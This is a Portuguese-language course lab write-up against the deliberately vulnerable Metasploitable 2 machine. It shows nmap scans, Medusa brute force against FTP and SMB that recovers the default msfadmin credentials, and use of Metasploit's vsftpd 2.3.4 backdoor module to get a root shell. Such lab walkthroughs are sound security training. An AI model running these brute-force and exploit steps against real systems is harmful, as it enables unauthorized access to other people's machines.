# Metasploitable2
Explorando falhas na máquina metasploitable2, como exercício do curso Santander Cybersegurança 2025.


Nesse projeto, estou testando falhas em uma máquina (Metasploitable 2). 
Serão realizadas as etapas de enumeração de alvos, busca de portas mais comuns para acesso, teste de Brute Force, Brute Force com Password Spraying e aproveitei para realizar um teste em um serviço comprometido utilizando o metasploit. Com o tempo e estudos, pretendo voltar a essa máquina para realizar novos tipos de acesso e irei acrescentar aqui as novas descobertas. 


1 - Enumeração

1.1 - Localizando máquina alvo

┌──(kali㉿kali)-[~]
└─$ nmap -sn 192.168.56.* 


Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-26 09:26 EST
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.56.1
Host is up (0.00044s latency).
MAC Address: 0A:00:27:00:00:11 (Unknown)
Nmap scan report for 192.168.56.100
Host is up (0.0028s latency).
MAC Address: 08:00:27:91:A9:51 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.102
Host is up (0.00098s latency).
MAC Address: 08:00:27:C2:AA:4D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.101
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.37 seconds



1.2 - Verificação das portas abertas

┌──(kali㉿kali)-[~]
└─$ nmap -sV -p 21,22,80,139,445,3306 192.168.56.102   

                  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-26 09:27 EST
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 09:28 (0:00:06 remaining)
Nmap scan report for 192.168.56.102
Host is up (0.00083s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
MAC Address: 08:00:27:C2:AA:4D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.69 seconds


2 - Criando Wordlists

2.1 - Criando Wordlist de usuários

┌──(kali㉿kali)-[~]
└─$ echo -e "user\nmsfadmin\nadmin\nroot" > users.txt

2.2 - Criando Wordlist de Senhas

┌──(kali㉿kali)-[~]
└─$ echo -e "123456\npassword\nquerty\nmsfadmin" > pass.txt 


3 - BRUTE FORCE no serviço FTP

┌──(kali㉿kali)-[~]
└─$ medusa -M ftp -h 192.168.56.102 -U wordlists/users.txt -P wordlists/passwords.txt -t 10

Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

2025-11-24 14:26:30 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (2 of 4, 2 complete) Password: msfadmin (1 of 4 complete)
2025-11-24 14:26:30 ACCOUNT FOUND: [ftp] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCCESS]
2025-11-24 14:26:34 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: user (1 of 4, 3 complete) Password: 123456 (1 of 4 complete)
2025-11-24 14:26:34 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: user (1 of 4, 3 complete) Password: password (2 of 4 complete)
2025-11-24 14:26:34 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: user (1 of 4, 4 complete) Password: querty (3 of 4 complete)
2025-11-24 14:26:34 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: user (1 of 4, 4 complete) Password: msfadmin (4 of 4 complete)
2025-11-24 14:26:34 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (2 of 4, 4 complete) Password: password (2 of 4 complete)
2025-11-24 14:26:34 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (2 of 4, 4 complete) Password: 123456 (3 of 4 complete)
2025-11-24 14:26:34 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (2 of 4, 5 complete) Password: querty (4 of 4 complete)
2025-11-24 14:26:34 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: admin (3 of 4, 5 complete) Password: password (1 of 4 complete)
2025-11-24 14:26:34 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: admin (3 of 4, 5 complete) Password: 123456 (2 of 4 complete)
2025-11-24 14:26:34 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: admin (3 of 4, 5 complete) Password: querty (3 of 4 complete)
2025-11-24 14:26:37 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: admin (3 of 4, 5 complete) Password: msfadmin (4 of 4 complete)
2025-11-24 14:26:37 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: 123456 (1 of 4 complete)
2025-11-24 14:26:37 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: password (2 of 4 complete)
2025-11-24 14:26:37 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: querty (3 of 4 complete)
2025-11-24 14:26:37 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: msfadmin (4 of 4 complete)


4 - PASSWORD SPRAYING no serviço FTP

┌──(kali㉿kali)-[~]
└─$ medusa -M smbnt -h 192.168.56.102 -U wordlists/users.txt -P wordlists/passwords.txt -t 5

Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

2025-11-24 14:30:32 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: querty (1 of 4 complete)
2025-11-24 14:30:32 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: msfadmin (2 of 4 complete)
2025-11-24 14:30:32 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (2 of 4, 1 complete) Password: 123456 (1 of 4 complete)
2025-11-24 14:30:32 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: 123456 (3 of 4 complete)
2025-11-24 14:30:32 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: user (1 of 4, 2 complete) Password: password (4 of 4 complete)
2025-11-24 14:30:32 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (2 of 4, 2 complete) Password: password (2 of 4 complete)
2025-11-24 14:30:32 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (2 of 4, 2 complete) Password: querty (3 of 4 complete)
2025-11-24 14:30:32 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (2 of 4, 2 complete) Password: msfadmin (4 of 4 complete)
2025-11-24 14:30:32 ACCOUNT FOUND: [smbnt] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
2025-11-24 14:30:32 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: admin (3 of 4, 4 complete) Password: 123456 (1 of 4 complete)
2025-11-24 14:30:32 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: admin (3 of 4, 4 complete) Password: password (2 of 4 complete)
2025-11-24 14:30:32 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: admin (3 of 4, 4 complete) Password: msfadmin (3 of 4 complete)
2025-11-24 14:30:32 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: root (4 of 4, 4 complete) Password: 123456 (1 of 4 complete)
2025-11-24 14:30:32 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: admin (3 of 4, 5 complete) Password: querty (4 of 4 complete)
2025-11-24 14:30:32 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: password (2 of 4 complete)
2025-11-24 14:30:32 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: querty (3 of 4 complete)
2025-11-24 14:30:32 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: msfadmin (4 of 4 complete)

5 - Iniciando o Metasploit Console

┌──(kali㉿kali)-[~]
└─$ msfconsole

5.1 - Procurando exploits no serviço vsftpd

msf > search vsftpd


Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 Denial of Service
   1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution



5.2 - Utilizando exploit vsftpd_234_backdoor e setando o RHOST com o ip da máquina alvo

msf exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.56.102
RHOSTS => 192.168.56.102

5.3 - Executando o exploit e conseguindo o Shell

msf exploit(unix/ftp/vsftpd_234_backdoor) > run
[*] 192.168.56.102:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.56.102:21 - USER: 331 Please specify the password.
[+] 192.168.56.102:21 - Backdoor service has been spawned, handling...
[+] 192.168.56.102:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.168.56.101:41809 -> 192.168.56.102:6200) at 2025-11-24 14:39:53 -0500

